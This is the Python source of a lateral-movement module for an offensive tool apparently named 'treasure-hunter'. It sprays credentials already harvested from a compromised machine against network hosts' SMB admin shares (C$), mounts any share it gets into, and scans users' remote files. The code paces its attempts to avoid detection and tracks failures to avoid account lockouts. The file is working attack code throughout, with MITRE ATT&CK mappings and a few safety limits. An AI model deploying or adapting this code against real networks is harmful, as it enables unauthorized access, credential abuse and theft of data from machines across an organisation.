"""
LATERAL MOVEMENT -- Credential reuse scanner

After local credential extraction (Grabber phase), tests extracted
credentials against discovered network hosts via SMB admin shares (C$).
On successful authentication, mounts the remote C$ and runs a scan
against the remote filesystem.

Level 2: Credential Reuse Scanner (implemented)
Level 3: Self-Propagating Agent (safety rail interfaces only)

MITRE ATT&CK:
  T1021.002 - Remote Services: SMB/Windows Admin Shares
  T1078     - Valid Accounts
  T1135     - Network Share Discovery

Usage:
  treasure-hunter --lateral                         # auto-discover + spray
  treasure-hunter --lateral --lateral-targets 10.0.0.0/24
  treasure-hunter --lateral --lateral-max-hosts 5 --lateral-max-failures 2
"""

from __future__ import annotations

import logging
import os
import platform
import re
import threading
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass, field
from datetime import datetime
from typing import TYPE_CHECKING, Any

from .models import (
    CredentialTestResult,
    LateralAuthStatus,
    LateralResult,
    LateralTarget,
)
from .network import _is_port_open, enumerate_network_targets

if TYPE_CHECKING:
    from .grabbers.models import ExtractedCredential
    from .reporter import StreamingReporter

logger = logging.getLogger(__name__)

# WNetAddConnection2W error codes -> LateralAuthStatus
_SMB_ERROR_MAP: dict[int, LateralAuthStatus] = {
    0: LateralAuthStatus.SUCCESS,
    5: LateralAuthStatus.ACCESS_DENIED,
    53: LateralAuthStatus.HOST_UNREACHABLE,
    64: LateralAuthStatus.HOST_UNREACHABLE,  # network name no longer available
    86: LateralAuthStatus.WRONG_PASSWORD,
    1219: LateralAuthStatus.ALREADY_CONNECTED,
    1326: LateralAuthStatus.LOGON_FAILURE,
    1327: LateralAuthStatus.ERROR,  # account restriction
    1328: LateralAuthStatus.ERROR,  # logon hours restriction
    1330: LateralAuthStatus.ERROR,  # password expired
    1331: LateralAuthStatus.ERROR,  # account disabled
    1909: LateralAuthStatus.ERROR,  # account locked out
}

# Terminal errors that count toward lockout
_TERMINAL_FAILURES: frozenset[LateralAuthStatus] = frozenset({
    LateralAuthStatus.WRONG_PASSWORD,
    LateralAuthStatus.LOGON_FAILURE,
    LateralAuthStatus.ACCESS_DENIED,
})


@dataclass
class LateralConfig:
    """Configuration for the lateral movement phase."""

    enabled: bool = False
    target_spec: str = "auto"
    max_hosts: int = 10
    max_failures_per_account: int = 3
    max_hop_depth: int = 1
    current_depth: int = 0
    smb_timeout: float = 10.0
    attempt_delay: float = 0.5  # seconds between auth attempts per host
    host_whitelist: list[str] = field(default_factory=list)
    host_blacklist: list[str] = field(default_factory=list)
    ttl: int | None = None  # lateral phase time limit in seconds
    scan_profile_kwargs: dict[str, Any] = field(default_factory=dict)
    # Level 3 safety rails (interfaces only)
    kill_switch: threading.Event = field(default_factory=threading.Event)
    auto_cleanup: bool = True


class LockoutTracker:
    """Thread-safe per-username failure counter to prevent account lockout."""

    def __init__(self, max_failures: int = 3):
        self.max_failures = max_failures
        self._failures: dict[str, int] = {}
        self._lock = threading.Lock()
        self.total_skips = 0

    def record_failure(self, username: str) -> None:
        """Record a failed auth attempt for a username."""
        with self._lock:
            self._failures[username] = self._failures.get(username, 0) + 1

    def record_success(self, username: str) -> None:
        """Reset failure counter on successful auth."""
        with self._lock:
            self._failures.pop(username, None)

    def is_locked(self, username: str) -> bool:
        """Check if username has exceeded failure threshold."""
        with self._lock:
            count = self._failures.get(username, 0)
            if count >= self.max_failures:
                self.total_skips += 1
                return True
            return False


def _filter_usable_credentials(
    credentials: list[ExtractedCredential],
) -> list[ExtractedCredential]:
    """Select credentials suitable for SMB authentication.

    Requires: credential_type == "password", non-empty username and
    decrypted_value. Tokens, cookies, keys, and certs are not usable
    for SMB password auth.
    """
    usable = []
    seen: set[tuple[str, str]] = set()
    for cred in credentials:
        if cred.credential_type != "password":
            continue
        if not cred.username or not cred.decrypted_value:
            continue
        key = (cred.username.lower(), cred.decrypted_value)
        if key in seen:
            continue
        seen.add(key)
        usable.append(cred)
    return usable


def _build_credential_matrix(
    credentials: list[ExtractedCredential],
    hosts: list[str],
) -> list[tuple[str, ExtractedCredential]]:
    """Build ordered list of (host, credential) pairs to test.

    Pass 1 (targeted): credentials with matching hostnames/IPs in their
    url field get paired with those specific hosts first.
    Pass 2 (general): remaining unique (user, pass) pairs tested against
    all remaining hosts.

    Deduplicates (host, username, password) tuples.
    """
    pairs: list[tuple[str, ExtractedCredential]] = []
    tested: set[tuple[str, str, str]] = set()  # (host, username, password)
    targeted_hosts: set[str] = set()

    # Pass 1: targeted spray -- match credential URLs to hosts
    for cred in credentials:
        if not cred.url:
            continue
        url_lower = cred.url.lower()
        for host in hosts:
            if host.lower() in url_lower or _extract_host(url_lower) == host.lower():
                key = (host, cred.username.lower(), cred.decrypted_value)
                if key not in tested:
                    tested.add(key)
                    pairs.append((host, cred))
                    targeted_hosts.add(host)

    # Pass 2: general spray -- all remaining combinations
    for host in hosts:
        for cred in credentials:
            key = (host, cred.username.lower(), cred.decrypted_value)
            if key not in tested:
                tested.add(key)
                pairs.append((host, cred))

    return pairs


def _extract_host(url: str) -> str:
    """Extract hostname/IP from a URL string."""
    # Strip protocol
    url = re.sub(r"^[a-zA-Z]+://", "", url)
    # Strip path first
    url = url.split("/")[0]
    # Strip auth (user:pass@host)
    url = url.split("@")[-1]
    # Strip port
    url = url.split(":")[0]
    return url.lower()


def _connect_smb_share(
    host: str, share: str, username: str, password: str,
) -> tuple[int, str]:
    """Connect to a remote SMB share using Windows API.

    Returns (error_code, unc_path). Error code 0 = success.
    Uses CONNECT_TEMPORARY (0x4) for OPSEC -- no persistent mapping.
    """
    if platform.system() != "Windows":
        logger.warning("SMB lateral movement requires Windows")
        return (-1, "")

    try:
        import ctypes
        import ctypes.wintypes

        class NETRESOURCE(ctypes.Structure):
            _fields_ = [
                ("dwScope", ctypes.wintypes.DWORD),
                ("dwType", ctypes.wintypes.DWORD),
                ("dwDisplayType", ctypes.wintypes.DWORD),
                ("dwUsage", ctypes.wintypes.DWORD),
                ("lpLocalName", ctypes.c_wchar_p),
                ("lpRemoteName", ctypes.c_wchar_p),
                ("lpComment", ctypes.c_wchar_p),
                ("lpProvider", ctypes.c_wchar_p),
            ]

        unc_path = f"\\\\{host}\\{share}"

        nr = NETRESOURCE()
        nr.dwType = 1  # RESOURCETYPE_DISK
        nr.lpLocalName = None  # no drive letter
        nr.lpRemoteName = unc_path
        nr.lpProvider = None

        # CONNECT_TEMPORARY = 0x4 -- no persistence across reboots
        result = ctypes.windll.mpr.WNetAddConnection2W(
            ctypes.byref(nr),
            password,
            username,
            0x00000004,
        )

        return (result, unc_path)

    except (AttributeError, OSError) as e:
        logger.error(f"WNetAddConnection2W failed: {e}")
        return (-1, "")


def _disconnect_smb_share(unc_path: str) -> bool:
    """Disconnect a previously connected SMB share.

    Returns True on success.
    """
    if platform.system() != "Windows":
        return False
    try:
        import ctypes

        # dwFlags=0 (no force), fForce=True (force disconnect)
        result = ctypes.windll.mpr.WNetCancelConnection2W(unc_path, 0, True)
        return result == 0
    except (AttributeError, OSError):
        return False


class LateralScanner:
    """Orchestrates the lateral movement phase.

    Discovers network hosts, tests extracted credentials against their
    SMB admin shares, and on success runs a scan on the remote filesystem.
    """

    def __init__(
        self,
        config: LateralConfig,
        credentials: list[ExtractedCredential],
        reporter: StreamingReporter | None = None,
    ):
        self.config = config
        self.credentials = credentials
        self.reporter = reporter
        self.lockout = LockoutTracker(config.max_failures_per_account)
        self._mounted_shares: list[str] = []
        self._lock = threading.Lock()
        self._start_time: datetime | None = None

    def run(self) -> LateralResult:
        """Execute the full lateral movement phase."""
        self._start_time = datetime.now()
        result = LateralResult(started_at=self._start_time)

        try:
            # Check depth limit (Level 3 safety rail)
            if self.config.current_depth >= self.config.max_hop_depth:
                logger.info(
                    f"Max hop depth reached ({self.config.max_hop_depth})"
                )
                result.completed_at = datetime.now()
                return result

            # Filter credentials usable for SMB auth
            usable_creds = _filter_usable_credentials(self.credentials)
            if not usable_creds:
                logger.info("No usable credentials for lateral movement")
                result.completed_at = datetime.now()
                return result

            logger.info(
                f"Lateral movement: {len(usable_creds)} usable credential(s)"
            )

            # Discover and filter targets
            targets = self._discover_targets()
            result.targets_discovered = len(targets)
            if not targets:
                logger.info("No reachable lateral movement targets")
                result.completed_at = datetime.now()
                return result

            logger.info(
                f"Lateral movement: {len(targets)} reachable target(s)"
            )

            # Build credential matrix
            matrix = _build_credential_matrix(usable_creds, [t.host for t in targets])
            target_map = {t.host: t for t in targets}

            # Test credentials against hosts
            for host, cred in matrix:
                if self._should_abort():
                    break

                target = target_map[host]
                if target.compromised:
                    continue  # already got this host

                test_result = self._test_single_credential(host, cred)
                target.auth_results.append(test_result)
                result.credentials_tested += 1

                if test_result.status == LateralAuthStatus.SUCCESS:
                    result.auth_successes += 1
                    target.compromised = True
                    result.targets_compromised += 1

                    # Stream success event
                    if self.reporter:
                        self.reporter.emit_lateral_success({
                            "host": host,
                            "share": test_result.share,
                            "username": cred.username,
                            "credential_source": cred.source_module,
                            "unc_path": f"\\\\{host}\\{test_result.share}",
                            "timestamp": datetime.now().isoformat(),
                        })

                    # Scan the remote host
                    unc_path = f"\\\\{host}\\{test_result.share}"
                    remote_result = self._scan_remote_host(
                        target, unc_path, cred
                    )
                    target.remote_scan_result = remote_result

                elif test_result.status == LateralAuthStatus.SKIPPED_LOCKOUT:
                    result.lockout_skips += 1
                elif test_result.status in _TERMINAL_FAILURES:
                    result.auth_failures += 1
                else:
                    result.auth_failures += 1

                # Stream attempt event
                if self.reporter:
                    self.reporter.emit_lateral_attempt(test_result.to_dict())

                # Delay between attempts to avoid detection
                if self.config.attempt_delay > 0:
                    time.sleep(self.config.attempt_delay)

            result.targets = targets
            result.lockout_skips = self.lockout.total_skips

        except Exception as e:
            logger.error(f"Lateral movement failed: {e}")
            result.errors.append(str(e))

        finally:
            if self.config.auto_cleanup:
                self._cleanup()

            result.completed_at = datetime.now()

            # Stream summary
            if self.reporter:
                self.reporter.emit_lateral_summary(result.to_dict())

        return result

    def _should_abort(self) -> bool:
        """Check kill switch, TTL, and other abort conditions."""
        if self.config.kill_switch.is_set():
            logger.info("Kill switch activated -- aborting lateral movement")
            return True

        if self.config.ttl and self._start_time:
            elapsed = (datetime.now() - self._start_time).total_seconds()
            if elapsed >= self.config.ttl:
                logger.info("Lateral TTL expired")
                return True

        return False

    def _discover_targets(self) -> list[LateralTarget]:
        """Discover hosts, check port 445, apply filters."""
        raw_hosts = enumerate_network_targets(self.config.target_spec)

        # Apply whitelist
        if self.config.host_whitelist:
            wl = set(h.lower() for h in self.config.host_whitelist)
            raw_hosts = [h for h in raw_hosts if h.lower() in wl]

        # Apply blacklist
        if self.config.host_blacklist:
            bl = set(h.lower() for h in self.config.host_blacklist)
            raw_hosts = [h for h in raw_hosts if h.lower() not in bl]

        # Cap at max_hosts
        raw_hosts = raw_hosts[: self.config.max_hosts]

        # Port check (parallelized)
        targets: list[LateralTarget] = []
        with ThreadPoolExecutor(max_workers=min(len(raw_hosts) or 1, 8)) as ex:
            future_map = {
                ex.submit(
                    _is_port_open, host, 445, self.config.smb_timeout
                ): host
                for host in raw_hosts
            }
            for future in as_completed(future_map):
                host = future_map[future]
                try:
                    port_open = future.result()
                except Exception:
                    port_open = False

                target = LateralTarget(host=host, port_open=port_open)
                if port_open:
                    targets.append(target)
                    logger.debug(f"Host reachable: {host}:445")
                else:
                    logger.debug(f"Host unreachable: {host}:445")

        return targets

    def _test_single_credential(
        self, host: str, cred: ExtractedCredential,
    ) -> CredentialTestResult:
        """Attempt one SMB authentication. Respects lockout tracker."""
        share = "C$"

        # Check lockout before attempting
        if self.lockout.is_locked(cred.username):
            return CredentialTestResult(
                host=host,
                share=share,
                username=cred.username,
                credential_source=cred.source_module,
                status=LateralAuthStatus.SKIPPED_LOCKOUT,
                timestamp=datetime.now(),
            )

        # Try bare username first, then host\username
        usernames_to_try = [cred.username]
        if "\\" not in cred.username and "/" not in cred.username:
            usernames_to_try.append(f"{host}\\{cred.username}")

        last_error_code = -1
        for username in usernames_to_try:
            error_code, unc_path = _connect_smb_share(
                host, share, username, cred.decrypted_value,
            )
            last_error_code = error_code

            status = _SMB_ERROR_MAP.get(error_code, LateralAuthStatus.ERROR)

            if status == LateralAuthStatus.SUCCESS:
                self.lockout.record_success(cred.username)
                with self._lock:
                    self._mounted_shares.append(unc_path)
                logger.info(
                    f"[+] Auth success: {username}@{host}\\{share}"
                )
                return CredentialTestResult(
                    host=host,
                    share=share,
                    username=username,
                    credential_source=cred.source_module,
                    status=LateralAuthStatus.SUCCESS,
                    error_code=error_code,
                    timestamp=datetime.now(),
                )

            if status == LateralAuthStatus.ALREADY_CONNECTED:
                # Share already mounted -- treat as success
                logger.info(
                    f"[*] Already connected: {host}\\{share}"
                )
                return CredentialTestResult(
                    host=host,
                    share=share,
                    username=username,
                    credential_source=cred.source_module,
                    status=LateralAuthStatus.SUCCESS,
                    error_code=error_code,
                    timestamp=datetime.now(),
                )

            # Terminal failure for this username variant -- try next
            if status in _TERMINAL_FAILURES:
                continue

            # Non-retryable error -- stop trying variants
            break

        # All username variants failed
        status = _SMB_ERROR_MAP.get(last_error_code, LateralAuthStatus.ERROR)
        if status in _TERMINAL_FAILURES:
            self.lockout.record_failure(cred.username)

        logger.debug(
            f"[-] Auth failed: {cred.username}@{host}\\{share} "
            f"(code={last_error_code})"
        )
        return CredentialTestResult(
            host=host,
            share=share,
            username=cred.username,
            credential_source=cred.source_module,
            status=status,
            error_code=last_error_code,
            timestamp=datetime.now(),
        )

    def _scan_remote_host(
        self,
        target: LateralTarget,
        unc_path: str,
        cred: ExtractedCredential,
    ) -> Any:
        """Run a scan on a successfully mounted remote share.

        Uses smash-equivalent settings: 5 min limit, high score threshold,
        grabbers disabled (we already have the creds).
        """
        from .scanner import ScanContext, TreasureScanner

        # Scan the Users directory on the remote C$ share
        remote_targets = []
        users_path = os.path.join(unc_path, "Users")
        if os.path.isdir(users_path):
            remote_targets.append(users_path)
        else:
            # Fall back to scanning the root of C$
            remote_targets.append(unc_path)

        logger.info(f"Scanning remote host: {target.host} via {unc_path}")

        try:
            remote_context = ScanContext(
                target_paths=remote_targets,
                max_threads=8,
                time_limit=300,  # 5 minutes per remote host
                min_score_threshold=50,
                grabbers_enabled=False,  # no need to run grabbers remotely
                **self.config.scan_profile_kwargs,
            )
            scanner = TreasureScanner(remote_context)

            # Share the reporter so remote findings stream to same output
            if self.reporter:
                scanner._reporter = self.reporter

            result = scanner.scan()

            logger.info(
                f"Remote scan complete: {target.host} -- "
                f"{len(result.findings)} findings, "
                f"{result.total_files_scanned} files"
            )
            return result

        except Exception as e:
            logger.error(f"Remote scan failed for {target.host}: {e}")
            return None

    def _cleanup(self) -> None:
        """Disconnect all mounted SMB shares."""
        with self._lock:
            shares = list(self._mounted_shares)
            self._mounted_shares.clear()

        for unc_path in shares:
            if _disconnect_smb_share(unc_path):
                logger.debug(f"Disconnected: {unc_path}")
            else:
                logger.warning(f"Failed to disconnect: {unc_path}")
